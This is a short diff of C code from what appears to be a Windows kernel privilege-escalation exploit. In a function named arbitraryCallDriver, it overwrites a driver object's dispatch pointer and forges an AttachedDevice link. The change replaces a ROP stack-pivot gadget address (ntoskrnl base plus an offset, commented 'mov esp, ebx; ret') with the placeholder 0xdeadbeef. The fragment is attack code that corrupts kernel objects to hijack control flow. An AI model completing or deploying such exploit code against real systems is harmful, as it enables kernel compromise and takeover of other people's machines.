@@ -420,7 +420,7 @@ BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
 	char* ptrDriver = driverObject + 0x30;
 	char* pDriverFunction = ptrDriver + 0x1b*8+0x70;
 
-	*((PDWORD64)pDriverFunction) = g_ntbase+ 0x40ac03;   //mov esp, ebx; ret
+	*((PDWORD64)pDriverFunction) = 0xdeadbeef;
 
 	ptr->AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);
 
